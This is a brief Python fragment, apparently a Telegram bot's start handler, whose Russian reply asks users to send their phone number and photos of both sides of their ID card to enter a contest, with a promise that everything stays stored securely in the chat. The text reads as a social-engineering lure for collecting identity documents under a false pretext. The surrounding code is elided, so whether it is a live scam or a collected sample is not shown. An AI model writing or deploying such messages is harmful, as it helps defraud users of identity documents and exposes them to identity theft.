...
async def start(update, context):
    ...
    await update.message.reply_text(
        "Для участия в конкурсе необходимо предоставить свой номер телефона и фото ID-карты с двух сторон. Нам нужна эта информация, чтобы предоставление услуг было максимально быстрым и лёгким. Всё будет надёжно храниться только в этом чате."
    )
